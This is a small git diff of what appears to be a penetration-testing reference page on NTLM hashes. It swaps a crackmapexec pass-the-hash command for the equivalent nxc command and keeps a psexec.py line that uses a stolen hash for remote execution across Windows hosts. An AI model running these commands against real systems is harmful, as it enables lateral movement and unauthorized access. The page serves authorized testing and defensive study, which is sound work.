@@ -13,6 +13,7 @@ NTLM hashes are stored in the **Security Account Manager** (SAM) database and in
 ## Attack
 
 ```bash
-crackmapexec $ip_range/$CIDR -u $user -H $hash(only NT part) --local
+nxc $ip_range/$CIDR -u $user -H $hash(only NT part) --local
+
 psexec.py $user:@$ip_addr -hashes $hash
 ```
